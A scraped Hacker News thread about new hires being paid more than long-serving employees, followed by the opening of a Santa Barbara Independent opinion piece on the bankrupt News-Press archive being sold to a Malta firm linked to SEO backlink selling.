sitting unused. reply compiler-guy 14 hours agorootparentprevIn addition to the other good answers here: If your product isn't ready and your competitor's is, you lose contracts and possibly life time customers. reply dragon-hn 14 hours agorootparentprevIt is fairly obvious. If it is expected that a product or set of features will drive X revenue per month, and you are late by Y months, then a decision that directly contributes to that delay just cost the company money. reply execat 7 hours agorootparentprevIn addition to everything mentioned here, projects based on holiday dates (Christmas sale feature, Thanksgiving promotions etc) not rolling out on time means that the feature can go out only in the next year. reply chucksta 13 hours agorootparentprevEX: Contract with commitments to release on a certain date, making them liable reply willcipriano 11 hours agorootparentprevLegal change requires a go live on a certain date. Modernizing and moving functionality to the cloud now instead of in a few months prevents renewal of a expensive contract. reply quickthrowman 13 hours agorootparentprevSome contracts specify liquidated damages if deadlines are not met. The contracts I’ve been a party to have daily cash penalties that will quickly erode any margin away. reply Saulivar 14 hours agoprevThere was an article at Forbes that said employees who stay with the company for more than 2 years are underpaid by as much as 50%. So why do they stay for so long? Humans are resistant to change. Speaking of myself, when I was working as a programmer, finding a new job meant going through endless interviews with leetcode tests even though I had 15 years experience. Turns out it was Joel Spolsky who invented that practice. I'm sure most programmers want to strangle that guy. Lol. As for me, I became a contractor. All my underpaid overtime turned into a paid one. Plus my contracts lasted a lot longer than my full time jobs. But even that what I later found out is what they call \"trading hours for dollars\". In order to really succeed I need to start my own business. Which required me to learn \"direct response marketing and copywriting\". Because being an Engineer I sucked at selling, finding hungry markets for my products, creating products and selling them by the millions. Once I figured that out, it's like a new world opened up to me. Turns out you can make as much money as you want. Unlimited amounts. It's up to you how much you want to make. I wish I would've figured that out earlier. reply thisiszilff 13 hours agoparent> Which required me to learn \"direct response marketing and copywriting\". How’d you go about getting good at these things? reply jmholla 10 hours agorootparentNot an answer to your question, more bolstering your comment, hoping someone else will come along and be encouraged to answer. Trying to learn about this on the internet is a nauseating series of blogspam. Edit: Although, this particular article doesn't seem so bad: https://mirasee.com/blog/direct-response-copywriting/ reply proc0 11 hours agoparentprevYou can only do this so much before you hit the pay ceiling of your role more or less. Then there is also the age factor, which whether it's justified or not the older you get the more expectations there are and the harder it becomes to jump ship. Personally my biggest gripe is how technical careers evolve into non-technical roles because of how companies underestimate the engineering and overestimate people skills. The pay gap would be easier to bridge if yearly reviews were based mostly on technical skill growth instead of other corporate jargon like \"impact\" or \"leadership\". reply ore0s 13 hours agoparentprevAny recent books you suggest on \"direct response marketing and copywriting\"? I've tried to read \"how to win friends and influence people\" \"ogilvy on advertising\" \"traction\" but haven't taken actions yet. reply avinassh 5 hours agoparentprev> Turns out it was Joel Spolsky who invented that practice. I'm sure most programmers want to strangle that guy. Lol. Did he though? or did you mean Fizz Buzz? But that was by his friend Jeff Atwood reply mooreds 11 hours agoparentprevI have contracted about 1/2 my career. I love the freedom and the honesty about outcomes and money. I missed the benefits (esp group health insurance) and the sense of teamwork. reply jodrellblank 10 hours agoparentprev> \"Turns out it was Joel Spolsky who invented that practice. I'm sure most programmers want to strangle that guy. Lol.\" Really? Here's Joel writing about his interviewing technique for software developers, it's a 1 hour interview with the focus on letting the interviewee talk about how smart they are: https://www.joelonsoftware.com/2006/10/25/the-guerrilla-guid... 1. Introduction 2. Question about recent project candidate worked on 3. Easy Programming Question 4. Pointer/Recursion Question 5. Are you satisfied? [with your whiteboard code answer] 6. Do you have any questions? Has he changed from that in the last 20 years? reply allthecybers 13 hours agoprevI've been rated in top tier/exceeds status for the last two years as a Senior level tech employee at a FAANG. This is after working up from entry level at hire, and promoting two times. Despite high performance and successful delivery of large projects, my base salary* has increased less than 3% in three years. Every single year, the company has come up with an excuse to not raise base salaries. It typically relates to economic intangibles, stock performance, or whatever corporate alphabet soup they choose. People hired halfway through my tenure got hired on with substantially higher base salaries, some who are a level below me. I really enjoy the work I do, but I just can't sustain less than 3% income growth over the course of the next three years. That's why I am looking elsewhere, not because I want to, but because I have to. Some roles I'm seeing below Senior level have starting salaries 50% higher than mine. *I am aware of the concept of total compensation and I do get company stock, but you can't pay bills month-to-month on funds that are six months away from being available, and you aren't sure whether you'll see a 6% upside or 6% downturn. reply JohnFen 13 hours agoparent> I am aware of the concept of total compensation I'm with you on this. When I'm evaluating an offer, the only part of the total compensation package that I really pay any attention to is salary because the rest is too uncertain. reply Groxx 15 hours agoprev>Interestingly, even employees who aren’t actively looking for a new job may become more aware of shifting market prices when a new hire joins at a higher salary, sparking concerns that they may be being taken advantage of. Because being paid less to do more means they are being taken advantage of. That's blindingly obvious. It's just that it was thrust in their face by the new hire occurring. reply saghm 14 hours agoparentYeah, I'm struggling to understand how this could be noted as \"interesting\". \"Wow, my employees think they should be paid for the work they're doing _without_ having to threaten me about leaving to get a raise? What a revelation!\" reply hinkley 15 hours agoparentprevIt’s not obvious to narcissists or little feudal lords, though I may be repeating myself. Give a man a little power… reply stagger87 14 hours agoprevRecently experienced an excellent colleague ask for a raise to $X, get rejected, leave, the replacement was hired for more than $X, the replacement complained about the workload being too much, and so we hired another body to cover the original developer leaving, again for more than $X. Absolute madness. reply sys_64738 14 hours agoparentWord of mouth means that the attrition will forewarn those who have the same thought process. reply erehweb 15 hours agoprevSounds plausible. The obvious Q though is - were the researchers able to identify a causal effect? Or could it be that the highly-paid new hire is a sign of the market being hot, so the top performers are able to get new better offers? i.e. would they have left even without the new hire? reply duxup 15 hours agoprevIn the late 90s I worked at a place that recognized the issue where they were having problems bringing people onboard so they offered more. But in our department they also did a yearly \"adjustment\" across the board to make sure they avoided paradoxical issue of new guy / longtime hire guy unexpected pay disparity. In that case the new guy getting paid more or close to the same was a largely non-issue as you knew you'd get adjusted. It was arguably good news for you. reply kstrauser 14 hours agoprevWhat broke me was seeing new employees get the same option grants as those of us who’d been there before our product launched. We took on all the risk and the years of startup salary to build the thing, and new people walk in with the same ownership? What the hell. I couldn’t forgive that. reply s3tt3mbr1n1 15 hours agoprevI’m in the unique situation where I’m hiring my replacement after having made a promotion. I know they will make (substantially) more than me. How would I negotiate a matching or superior salary? reply jedberg 15 hours agoparentEveryone else is telling you to leave or try a power play, but food for thought -- you may actually be less valuable now in your new role because you aren't experienced in it. If you just moved from IC to manager, you might be a pretty new manager. It's normal for managers to have reports that make more than them. Just because you manage them doesn't make you more valuable. I'm not saying this is the case for you in particular, but it might be, so something to consider before playing hardball. reply s3tt3mbr1n1 14 hours agorootparentThat’s very insightful and the argument I would expect if I were to start discussions about salary. How would you counter this? I would also say I’m more qualified for the job than those that are applying now, so I’m not sure if this really is applicable to me. reply anal_reactor 5 hours agorootparent> How would you counter this? \"I asked for a promotion, not for a complete career switch\". reply slim 3 hours agorootparentprevmaybe it's no the right time to negotiate your salary ? given there is competition for your job position and your competency is not proven. why not wait till next year ? reply vundercind 15 hours agoparentprevOffer to step back into that position because taking the promotion will reduce your pay to under the going rate for the position you’re leaving. reply Jcampuzano2 15 hours agoparentprevYou just got a promotion, so now you're in a better position to make more money by leveraging the new level/status at another company. Leave or get a competing offer to use as leverage if you really like your company. reply bevekspldnw 15 hours agoparentprevCompeting offer. Go interview. reply bboygravity 14 hours agoparentprevRead a book or watch some Youtube videos about negotiating (in general)? reply s3tt3mbr1n1 14 hours agorootparentAnything you would recommend, specifically for salary negotiations? reply mooreds 9 hours agorootparentJosh Doody's stuff is pretty good: https://fearlesssalarynegotiation.com/ reply thot_experiment 15 hours agoparentprevLeave. reply rjbwork 15 hours agorootparentUnfortunately this is the answer. The bean counters do not give a shit about your experience or value. They just need warm bodies. They know the friction of leaving a company is high so they'll intentionally make you feel like a sucker until you finally quit, getting more years and months out of you for a lower rate than you deserve. When you finally do leave, they'll pat themselves on the back for retaining you for so long at a depressed wage. reply hallway_monitor 15 hours agorootparentI guess the problem with bean counters is they don't know how to count our beans. The low performers look exactly the same as the high performers to them. So they make foolish decisions. reply ThrowawayR2 15 hours agorootparentprevLeave? Into what is anecdotally the worst job market for developers since 2008 and maybe even the dotcom bust? reply eastbound 13 hours agorootparentI don’t understand this remark. It’s still incredibly hard to find engineers here in Europe (I’m hiring at 5x the minimum wage, to give an idea). Where are the swathes of unemployed people that you are describing? Are a quarter of American IT professionals unemployed? reply austin-cheney 15 hours agoprevWith higher pay plus less experience comes entitlement. It’s the attitude of I shouldn’t have to do x, y, or z. Usually it’s because they can’t do those things and in full fear mode vomit some bullshit excuses. That, more than anything else, is why I’m in another line of work full of former programmers who are eager to do something else. reply Gasp0de 15 hours agoparentWhat line of work is that? reply jpgvm 14 hours agorootparentProbably wood working, seems to be where all the burnt out programmers end up. reply karaterobot 14 hours agorootparentI can think of half a dozen former programmers I know who now do things like finish carpentry, furniture building, luthierie, and other fiddley wood stuff, and it's been a private joke with friends. I didn't know it was such a widespread phenomenon though! reply lukan 14 hours agorootparentprevOr teachers. reply lexh 14 hours agoparentprevWhat line of work is full of former programmers? reply sys_64738 14 hours agorootparentNowadays, that's the unemployment line. reply tombert 15 hours agoprevCan someone who understands economics better than me explain how the workforce can \"shrink\" in 2024? The number of people isn't going to dramatically decrease, are just a ton of people retiring? Or does this imply that there's going to be a reduction in the number of available jobs? reply cbhl 15 hours agoparentIf you do not have a job and are not actively looking for work, you are not part of the \"labor force\". The \"labor force\" is defined as (working + actively looking). Also, the denominator of the unemployment rate is the size of the labor force, not the size of the working-age population. In particular if someone gives up on looking for a job because they're too discouraged, or if someone decides to become a stay-at-home parent, this causes the size of the labor force to go down by one person. Search for: \"labor force participation rate\". Also some definitions here (US-specific): https://www.bls.gov/cps/definitions.htm Here's also the transcript of the Planet Money podcast from March 2023 which talks about reasons folks left the workforce at that time: https://www.npr.org/transcripts/1162753771 reply tombert 15 hours agorootparent> In particular if someone gives up on looking for a job because they're too discouraged, I've never understood that either; do other people just not have to pay rent or buy groceries? How do you \"give up looking for a job\"? I understand becoming a stay at home parent, but what else would make it so you \"give up\" looking for paid work? This isn't a rhetorical question, I am actually asking because I feel like I'm missing something. reply akavi 15 hours agorootparentThey rely on the incomes of family members, savings, or governmental transfer payments (social security, welfare, disability, etc). Not sure the percentages of each, but those categories probably about cover it. reply tombert 15 hours agorootparentThat's fair, I guess if you're already around retirement age, being unable to find a job might be an impetus to quit looking. reply saghm 14 hours agorootparentI think there's also nuance in what \"actively looking\" means. Someone might decide to stop actively looking but not permanently retire and instead wait until conditions are different; maybe someone in their 20s or 30s might move back in with their parents for a bit, or maybe someone just decides that living more modestly for a year and then trying again either when more jobs are available or when they're less burnt out. Even less common things, like having to go on disability to to an injury or illness might add up to a decent number when aggregating across an entire country. I think the main point is that the single statistic alone doesn't describe \"why\" or \"for how long\", only \"how many\"; there's (almost literally) a world of potential reasons that aren't necessarily going to be related to any others. reply derekdb 13 hours agorootparentprevI've see this happen to a number of friends. Most of them have enough saving that they can 'retire', but none of them wanted to retire yet. It often means moving away from friends to implement a lower cost-of-living. Once you are >40, it can be hard to find a job. You are too experienced for mid-level roles, but your core skillset may no longer be relevant. e.g. There are far fewer Win32 developers than 10 years ago, but retraining to be a web developer can be a big challenge. I've also seen people get promoted to a managment level, based on a targetted skillset, where it can be hard to find find a new role. reply ghaff 15 hours agorootparentprevTo put a positive spin on it, within a certain age and savings range, someone might choose not to be underemployed or just say screw it if they weren't finding anything they were looking for. Admittedly that's basically a fairly high earner story so a fairly small part of the mix. But I can absolutely see someone checking out a few years before they might have chosen to if they're not finding what they're looking for and don't want or need to be a Starbucks barista. reply JohnFen 13 hours agorootparentprevThe devs that I've known who've dropped out of the market have lived on their savings and investments. reply dragonwriter 15 hours agorootparentprevIts worth noting that the “working age population” has a starting age but no ending age; once you cross 16, you are in the denominator for the labor force participation rate until you die. 106? Still in the “working age population”. There's also a “prime age labor force participation rate” which has both a start (25) and end (54) age for the denominator population, and the prime age LFPR has been strong [0] as the full LFPR has dropped [1] because of the Boomer demographic bulge making age-related exits from the labor force. People who like to sell unemployment as underrated by the official statistic in recent years like to point at the drop in the full LFPR and insinuate its because of prime-age population being pushed out of the labor force, when looking at the prime age LFPR reveals that that is not at all true. [0] https://fred.stlouisfed.org/series/LNS11300060 [1] https://fred.stlouisfed.org/series/CIVPART reply dragonwriter 15 hours agoparentprev> Can someone who understands economics better than me explain how the workforce can \"shrink\" in 2024? There is a generational demographic bulge in an age range where both death and retirement of those who have not yet done so are things that are not unlikely. On the other end, there is the opposite of a bulge at the age people enter (for statisticsl purpose) the workforce. reply tkiolp4 14 hours agoparentprevDeveloped countries have a low fertility rate, so fewer young people and tons of oldies. Perhaps is not going to be noticeable right away, but it’s gonna hit us hard. reply hinkley 15 hours agoparentprevThe Ballard neighborhood of Seattle experienced a lot of business turnover starting about ten years ago because many of those stores don’t own their own buildings, the landlords got dollar signs in their eyes, and a lot of older business owners looked at their books, realized how much extra money they were going to have to make per square foot just to keep the lights on, and opted to “retire” instead of renewing their lease or selling the business. “I am too old for this shit.” Seems to have been the common refrain. You can also shrink the employee pool by having more 20-something’s living at home and fewer dual income families. reply rjbwork 15 hours agoparentprevIn the industrialized world, the fertility rate is almost universally below replacement rate, and has been for a long time. So, as boomers are retiring, there are not as many people replacing them. reply sdenton4 15 hours agorootparentIf only there were lots of people from not-the-US who wanted to live in the US... reply rjbwork 13 hours agorootparentExpanding legal immigration is a political impossibility at the moment. We'll have a lot of near slave-wage bodies for the worst jobs around though. reply hallway_monitor 15 hours agorootparentprevPeople don't seem to understand that we need the next generation of people. Especially in the US, if you have a partner and are financially stable, please have at least three kids. reply tombert 15 hours agorootparentI live in the US, have a decent-paying job, but I don't have any kids, and I got a vasectomy so it seems unlikely that I will have any kids. If something happens by accident (e.g. the vas deferens heals), my wife and I would almost certainly keep it and we'd be parents, but I don't think that's terribly likely. I actually do really like kids, I like my nieces and nephew, but the problem is that the value proposition for having kids is not terribly high. They're expensive, and time consuming, and honestly kind of a liability. It's especially hard for women, because pregnancy takes you out of the workforce for a long time, and women are still (however unfairly) typically the \"primary caretaker\" for the child. Since your 20's are generally the optimal time to grow your career, it's an extremely high opportunity cost to have a child. I've never wanted to have my own kids. My wife and I have agreed to take care of our nieces and nephew if something happens to their parents, but I don't think I'd be a terribly good parent, and I would prefer to avoid screwing up another human. reply withinboredom 15 hours agorootparentIf you look at children as some utility-investment ... yeah, you probably shouldn't have kids. But, you are incorrect even then. Eventually, you will get old. Your siblings and parents will be long gone. Then your spouse. You'll have nobody to pass your knowledge on to, at least, nobody to pass it on to that actually cares in a way only a child can about a parent. No grandchildren to spend time with that you simply didn't have the time to as a parent. I don't know man. I had some cancer, and recently got a tumor in my fucking face. I can tell you right now, when faced with death: careers and money means shit. reply tombert 14 hours agorootparentIt's not just utility on my end; I think it would be selfish. In the last twelve years I have had sixteen jobs. That number being so high wasn't really by choice; I've been fired and laid off a bunch of times. We can wax philosophical to the reasons why, but one thing that has become clear to me is that I'm not a terribly stable person. I am often pretty mean, short-sighted, and impulsive. When you don't have kids, those attributes are kind of considered \"eccentric\", but if you do that to a kid you're (correctly) considered \"abusive\". It's one thing to be the primary breadwinner and have your income cut off twice a year when I only live with adults, but it's another when there's a tiny human who is 100% your responsibility depending on it. If I had a kid, it would be a purely greedy move on my end. They would be a prop, like a puppy, there to make me feel better more than any kind of altruism. It's one thing to use a pet as a means of self-comfort, it's another to use another person. Occasionally I will get the urge to \"pass my knowledge on\", which is why I will occasionally do adjunct lecturing at a nearby university. The students don't just accept everything I say implicitly like a child would, but that's alright and I don't think I would want someone to automatically believe all the shit I say. I think even when I'm old and alone, I'll find ways to keep myself entertained. To be clear, I'm not one of those toxic r/childfree assholes. I don't have a problem with people having kids. I was very happy when my sister told us she was pregnant. I like kids, I try pretty hard to be a decent uncle to my nieces and nephew. I just don't want to be responsible for their development. reply CapstanRoller 14 hours agorootparentprevWhat does child-bearing have to do with any of this? There are plenty of humans in the world, and plenty of children (including orphans). If you really care that much about passing on knowledge, write a book or get into teaching. You'll reach a much wider audience that way, and if your knowledge is indeed valuable then your impact will exceed many human lifespans. Literature can survive for a thousand years at least. Creating entire new humans simply to use them as personal data storage devices seems cruel and bizarre. Maybe consider a NAS instead? reply throwaway6734 14 hours agorootparentprev> but the problem is that the value proposition for having kids is not terribly high. They're expensive, and time consuming Yes but you get to pass the gift of life off to another person which I think is the greatest thing one person can do for another. It's a sacrifice so someone else will get to experience their first spring, their first love, the great works of art of humans past, etc. >I don't think I'd be a terribly good parent, and I would prefer to avoid screwing up another human. You sound like you'd be a great father. From a stranger who had their first 2 years ago with a second on the way, please reconsider your vasectomy. I can't stress the absolute joy and love it has brought my wife and I. reply rjbwork 15 hours agorootparentprevI understand, I just don't care. It's the economic elites who don't seem to understand that they need a next generation to exploit and that the proletariat cannot be squeezed indefinitely. Eventually we look around and say \"fuck this, I'm not wrenching sentience from the void to live in this morass\". reply Ancalagon 14 hours agorootparentprevOh boy I could have a field day with this hot take. Have at least three kids, don’t think about the rising healthcare, education, food, and childcare costs though. Don’t mind the huge increase in car costs - basically a requirement to travel and work in the US. Don’t mind the stagnating pay. Don’t mind the coordinated reduction in pension and 401k benefits we are seeing, nor the steadily decreasing social security funds. You wouldn’t need that money you spent raising three kids on retirement or anything. Nevermind the total lack of job security and universal healthcare in this country. While EU countries have very strict requirements for layoffs, the majority of the US is at-will and you can be laid off at any moment. You will not have healthcare after a paltry few weeks unless you want to spend a lot of money. Did I mention the lack of healthcare? Let’s dive a little deeper. Do you have any idea how much it costs just to visit a hospital and birth babies? Various parts of the US have essentially 3rd-world death statistics for birthing mothers (especially minority mothers). A big part of that is cost to birth a child is too high and these mothers won’t trust or visit a hospital. Why three kids specifically by the way? Standard starter houses are 3bd/2bath here. Guess mom and dad need a bigger house then. Should I continue? reply autoexecbat 15 hours agorootparentprev> please have at least three kids. I'm very happy to do so - on exacally one condition, daycare becomes free. reply SamuelAdams 12 hours agorootparentSee this is interesting to me. For daycare to become free to parents, ideally governments would subsidize it to 100%. That money comes from somewhere, so probably taxpayer dollars. So you are still paying for it, just slightly more indirectly. So, would you rather pay a lot for childcare all at once when you need it (for 5 years per kid), or pay a little via taxes forever? reply autoexecbat 11 hours agorootparentForever, for two reasons. 1. It's a large financial hit at an already highly stressful time. It's usually also a non-optional expense. 2. It also taxes those who are childless. We already do free childcare via K-12 education in the US via taxes, we just need to fill in the gap before that. reply CapstanRoller 15 hours agorootparentprev>we need the next generation of people Who is \"we\"? Are you a business owner in need of an ever-increasing pool of cheap labor, or a business owner in need of an ever-increasing customer base, or a land owner/real estate developer/landlord in need of an ever-increasing population requiring housing? (I won't even get into the massive environmental impact of having a child, let alone three!) >if you have a partner and are financially stable, please have at least three kids. For what purpose? reply georgemcbay 15 hours agorootparentprevOr we could slightly rethink our economic system and buy ourselves some time to deal with all the problems we caused previously due at least partially to unsustainable population growth. https://media.npr.org/assets/img/2015/01/25/tomtoro03_wide-6... reply kdfjgbdfkjgb 15 hours agoparentprevif you click on the word shink in the article, it takes you to another article that explains boomers are retiring and they are a larger generation than the younger ones who will replace them. reply rufus_foreman 15 hours agoparentprevEven though 1/3 of the Baby Boomer generation are already dead, they are still a larger percentage of the population than Generation X. Generation X also has a smaller share of population than the Millenial Generation and Generation Z. -- https://www.statista.com/statistics/296974/us-population-sha... reply turtlebits 15 hours agoprevThis is why you don't stay at a company for more than X years - IME, it's probably around the 3 year mark? I once received > 2x comp after leaving a company I had been at for 6 years. reply geraldwhen 15 hours agoparentSome companies pay fine. I’m not going to find 250k for how easy my work is jumping ship. reply Jcampuzano2 15 hours agoprevWell no shit. If I'm currently a top performer and we hire new workers at a higher pay rate than me, if I have to wait to get a raise because of BS corporate bureaucracy then the company should know from the second they say no I have my foot halfway out the door. Funnily enough at many companies the second you actually threaten to leave, that corporate BS suddenly isn't an issue. But trust has already been lost. Exactly as mentioned in the article but what should be basic common-sense. Why would I continue to work as hard as I do being a known top performer just for somebody who is new and has no history to get paid more than me. But of course some of this may actually be exactly what some companies want in this backwards world, get rid of top performers who expect a pay raise in favor of those who don't expect one anytime soon like new employees. Set the expectation to new employees to not expect raises, etc. reply theshrike79 15 hours agoparent> at many companies the second you actually threaten to leave, that corporate BS suddenly isn't an issue Not \"many\" - \"every company\". Unless you're an useless cog in the machine, you can always leverage a raise by saying you got a better offer somewhere else. In very rare cases it pays to take the raise from the old company though, your name is already on a List, so better start looking for other jobs anyway. reply fnord77 14 hours agoparentprevCovid really pulled the veil back on \"BS corporate bureaucracy\". So many bureaucratic sacred cows went out the window. reply c_o_n_v_e_x 5 hours agoprevHow often are you supposed to \"mark to market?\" Quarterly? What happens when the markets drop? Will employees accept seeing their comp drop? I suppose you could offer some base level of compensation + have some market adjusted component? Having the entire salary marked to market creates uncertainty in annual compensation. Or you give employees options on how frequently they want their salaries to be re-evaluated but that comes with the potential of going down? reply mancerayder 9 hours agoprevCan someone tell tech hiring on Wall Street? Financial companies seem to suffer from salary rot, a seasonal affliction appearing towards and after Comp Day. New hires get paid more. Sometimes a lot. Salaries are geared to stay at or just above inflation while more risk is taken by the employee due to bonus turning after a few years not into \"bonus\" but \"missing piece of salary\". reply from-nibly 14 hours agoprevProgramming as theory building has been the rock that explains how stupid companies are with how they turn retaining employees into a financial game. https://pages.cs.wisc.edu/~remzi/Naur.pdf Your employees ARE your company. Every time you lose an employee you are cutting a chunk out of your company. Sometimes this is good. But if you lose a top performer its like losing your kidneys. You are going to be on dialasis for a long time. ...this metaphore makes me think about how insane it would be for a person to look at their organs as a financial puzzle to solve. Like what if dialasis was less expensive than not selling your kidneys. reply throwaway194832 14 hours agoprevThis is happening to me in real time. New hire will have higher job title than me and more pay but will be taking over my work. 2 people on the team already put in their notices. reply altdataseller 13 hours agoprevFor those wondering why companies do this, I wrote a post on this awhile back https://bloomberry.com/why-new-hires-often-get-paid-more-tha... reply Havoc 14 hours agoprevWell duh - when something is/feels wrong those with options bail first. Not exactly rocket science reply ALittleLight 15 hours agoprevMakes sense. New hire gets paid a lot, everyone updates on what they should be getting paid, top performers have the best chance of getting jobs elsewhere and they now know they should be getting paid more. Seems like this consideration makes hiring new people much more expensive. Either you pay everyone (or just top performers) more or pay the new hires less and likely attract a lower tier of new hire which has its own cost. Employees should do more to share their pay so everyone knows how much everyone else is getting paid. I mostly think there should be a law mandating this - every employer with more than 100 employees must publish summary statistics on wages at every job category. I recall reading that CEO pay skyrocketed after a law intended to reduce CEO pay required that CEO compensation had to be disclosed. It had the opposite effect and CEOs started to make much more. Seems like we should apply that same thing to the average worker. reply vundercind 15 hours agoparentBasically anything companies don’t want workers to be able to do is good for the workers and bad for the companies. They don’t want us sharing pay. They don’t want to have to post comp ranges in job postings—they don’t want it to be easy for us to compare job postings. That means it’s a safe bet that both of those tend to increase worker comp. reply sandspar 2 hours agoprevHBR is great at cranking out Just So stories like this. \"Shucks, who could have guessed that the leadership style I learned in my 2010's American Northeastern university MBA is scientifically proven to be the best leadership style in all of human history?\" reply slibhb 13 hours agoprevDefine \"pay equity\" please. Does that mean everyone in the same role gets paid the same? Everyone with the same seniority gets paid the same? Something else? Sure, some people are getting paid too little and others too much. But the concept of \"equity\" has no place here. It suggests that you \"deserve\" to paid equally. But equal to whom? And based on what? A new hire can be more valuable than a veteran. Two people in the same role can contribute different amounts. reply alexchamberlain 13 hours agoprevI don't understand how this practice is legal; don't we all have laws on equal pay for equal work? reply adolph 15 hours agoprevI have a periodic thought exercise of a counterfactual where our culture had developed in a way that paid early career people relatively more than now and vice versa for late career. The concept behind it is that interest compounds and beyond basic competence it can be difficult to tell the relative value of experience versus eagerness and top performers with/without the supportive environment in which they operate. reply kjkjadksj 14 hours agoparentOn top of that in terms of your life outside of work, some of your biggests costs are up front in your life. Education, childcare, housing, paying into retirement plans through it all, etc. When you are in your 50s-60s with your kids moved out, your healthcare later in life to be subsidized by the government, your home payed off, your student loans long gone, your retirement portfolio built out, with another 20 years lets say on average of life left in you, what do you even need a raise for? reply golergka 15 hours agoprevIf you're willing to attract new hires with more pay, your competitors are willing too. reply ChrisMarshallNY 14 hours agoprevObligatory MonkeyUser: https://www.monkeyuser.com/2020/new-hire/187-new-hire.png reply snotrockets 12 hours agoprev [–] And in other news: elephants are quite big, the sun is hot, water is wet. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Pay transparency is rising across different industries, causing existing employees to notice salary gaps with new hires.",
      "Research indicates that without adjusting salaries for current staff post new hiring, top performers may resign.",
      "Employers are advised to perform consistent pay equity assessments and promptly modify wages to prevent potential talent loss."
    ],
    "commentSummary": [
      "The discussion highlights challenges of salary disparities, especially when new hires earn more than experienced workers, leading to top performers leaving and existing employees feeling undervalued.",
      "Importance of transparency in salaries, negotiating higher pay, and the influence of market conditions on compensation are emphasized.",
      "The debate also covers retention strategies, career development, shifting workforce demographics, family planning, knowledge transfer, economic struggles of parents in the US, and the impact of generational gaps in the workplace."
    ],
    "points": 245,
    "commentCount": 196,
    "retryCount": 0,
    "time": 1711735674
  },
  {
    "id": 39868630,
    "title": "Preserving Santa Barbara's Digital History Amid Bankruptcy Threat",
    "originLink": "https://www.independent.com/2024/03/29/santa-barbaras-collective-memory-sold-for-kindling/",
    "originBody": "Opinion Voices Santa Barbara’s Collective Memory, Sold for Kindling Will 'NewsPress.Com' Become a Zombie Website? By William Belfiore Fri Mar 29, 20248:32am Share this: Click to share on Facebook (Opens in new window) Click to share on X (Opens in new window) Click to email a link to a friend (Opens in new window) Click to print (Opens in new window) Add to Favorites Exterior of the News-Press building at De La Guerra Plaza, circa 1950.Credit: Gledhill Library, Santa Barbara Historical Museum. History rarely feels like history when you’re living through it. But if you have spent even a day in Santa Barbara anytime since 1868, you have played a part in a continuous community story catalogued by the former newspaper of record, the Santa Barbara News-Press. Until its bankruptcy last year, the News-Press provided an unbroken 155-year chronicle of a place and its people. In so doing, a hometown newspaper recorded our history, from notices of birth and graduation to weddings, obituaries, and everything in between. The Santa Barbara News-Press was delivering our history to us in real time, six days a week. Many of us know it as the paper we picked up on our doorsteps, but for the last 30 years or so, we could also read the stories of our community online. It is this digital archive that is now in imminent danger of being lost forever as assets of the bankrupt paper go to auction. The Sandbagger As many locals will remember, the Santa Barbara News-Press was purchased in 2000 by reclusive local billionaire Wendy McCaw from The New York Times Co. for somewhere around $110 million. Beginning in 2006, McCaw began meddling in the editorial independence of the newsroom, attempting to alter and sandbag legitimate stories she believed would embarrass her inner circle of the rich and powerful. As one might expect, such brazen attempts to put a thumb on the scale of factual “straight news” ran afoul of journalism’s accepted standards of professional ethics. Under the leadership of then-editor Jerry Roberts, the newsroom rightly chose to publish the stories anyway, setting in motion an eventual mass walk-out of the paper’s staff and triggering a decade-long scorched-earth legal and public slander campaign by the billionaire owner to discredit her former employees. Our homes and businesses boycotted the paper, braving a volley of coercive “cease and desist” letters from McCaw in a show of solidarity for the journalists. The debacle received national press attention and, buttressed by the endlessly wealthy and cartoonishly malicious newspaper owner, became the subject of the aptly named 2007 documentary Citizen McCaw. It is under this unfortunate tutelage — or more rightly, terror — that the former Pulitzer Prize–winning paper is eventually reduced to a shell of its former self. Though the handful of reporters that remained continued to dutifully report on our community, the damage was already done. The paper declared bankruptcy on July 21, 2023. In a fitting final insult, the court filing listed more than $116,000 in company assets — an implausibly low valuation — as it was revealed McCaw had previously shifted the real estate property of the newspaper’s historic De la Guerra Plaza headquarters and Goleta printing plant into private LLCs under her control. The newspaper’s undigitized physical archive of microfiche and newsprint, presumably locked inside these buildings, are similarly held hostage. The bankruptcy attorneys have rightly called the property transfers a sham intended to shield the assets from liquidation, though the legal wrangling to prove foul play may take years. The Backlinks Endgame It is, however, this complication that has set the stage for what is perhaps the most bizarre twist yet in the Santa Barbara News-Press saga. In an attempt to rustle up some amount of money to repay the paper’s nearly 900, mostly local creditors, the Bankruptcy Court has now turned to liquidating the paper’s “Online Assets.” Overseen by bankruptcy trustee and Santa Maria attorney Jerry Namba, the move is — at least in principle — a perfectly reasonable one. According to court documents, the trove includes the paper’s online content, amounting to perhaps 30 years of digital archives, as well as social media accounts, trademark, and the website domain names “newspress.com” and “sbnewspress.com.” All told, the contents will allow a buyer to become the paper’s rightful legal owner, albeit without any real estate property. As of March 7, 2024, an entity listed as Weyaweya, Ltd., incorporated in the European island nation (and oft-cited corporate tax haven) of Malta, has already entered into tentative agreement to buy the lot. The as-of-yet unfinalized sale agreement has been signed by a Max Noremo, to the tune of $250,000. For the Santa Barbara community living through its own history, a quarter-million price tag to preserve roughly 30 years of digital primary source archival records may not seem altogether ludicrous. A no-name foreign firm headquartered in the middle of the Mediterranean Sea shelling out the same for a small town’s Podunk paper, however, stretches the limits of credulity. Even accounting for the potentially valuable website domain name newspress.com, the facts of the case give pause. What value could such a company see in a record of our community’s collective memory? A cursory online search for Weyaweya, Ltd. turns up little, while a bit of digging makes clear it is likely an entity set up expressly as a vehicle to acquire the News-Press assets. A bit more dogged digital spelunking uncovers a disturbing potential endgame for our small-town archive. The party looking to buy our archive is but one node in a network of shell companies associated with Noremo. At the center of the scheme is a small Malta-based company called Link.Builders, which provides Search Engine Optimization (SEO) services to online customers. SEO companies assist other businesses in ranking more highly in online search engine results pages, such as from Google, Bing, Yahoo, etc. When websites rank more highly in online search results, they receive more online traffic, earn more advertising revenue, and make more sales. As a result, SEO service to companies looking for improved search engine placement has now exploded into a multi-billion-dollar global industry. Noremo’s company specializes in a particular subsegment of SEO providing what are known as “backlinks,” or simple internet links that take a user from one website to another. Backlinks can be important to a website’s profitability because search engines such as Google view a website with many high-quality backlinks from reputable and relevant third-party sources as more trustworthy and authoritative. As a result, some companies will pay to place “artificial” backlinks into third-party websites in order to boost the search result ranking of their own site. Increasingly central to the business model of backlink selling are the purchase and maintenance of websites with reputable content archives within which a company such as Link.Builders can then insert customers’ paid backlink content. In this way, the low-quality, pay-to-play content that search engines like Google would otherwise deprioritize in their search results are effectively camouflaged within a preexisting content archive that Google already trusts. The practice is controversial within the SEO industry for its ethically 